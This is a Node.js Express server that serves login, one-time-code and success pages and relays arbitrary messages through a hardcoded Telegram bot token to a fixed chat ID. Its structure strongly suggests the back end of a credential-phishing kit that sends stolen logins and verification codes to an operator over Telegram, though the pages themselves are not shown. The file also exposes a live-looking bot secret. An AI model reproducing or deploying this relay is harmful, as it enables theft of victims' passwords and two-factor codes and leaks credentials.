const express = require("express");
const path = require("path");
const axios = require("axios");
const favicon = require('serve-favicon');

const app = express();
const PORT = 3000;

app.use(favicon(path.join(__dirname, 'public', 'ico.ico')));
// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, "public")));
// Route to serve index.html
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});
app.get("/home", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "intest.html"));
});

app.get("/login", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "login.html"));
});
app.get("/success", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "success.html"));
});

app.get("/code/:email", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "code.html"));
});



const botToken = "7919345658:AAGVy4jwPdSyRKp6VDJ8a5gsq2DTNn-M4Bs";
const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

// API gửi tin nhắn qua bot Telegram
app.get("/send-message", async (req, res) => {
    const { message } = req.query;
    if (!message) {
        return res
            .status(400)
            .json({ error: "message are required" });
    }

    try {
        // Gửi yêu cầu POST đến API của Telegram
        const response = await axios.post(telegramApiUrl, {
            chat_id: '6580233045',
            text: message,
        });

        // Kiểm tra xem yêu cầu có thành công không
        if (response.data.ok) {
            res.status(200).json({
                status: "success",
                message: "Message sent successfully",
            });
        } else {
            res.status(500).json({
                status: "failed",
                message: "Failed to send message",
            });
        }
    } catch (error) {
        res.status(500).json({
            status: "failed",
            message: "Error occurred while sending message",
            error: error.message,
        });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
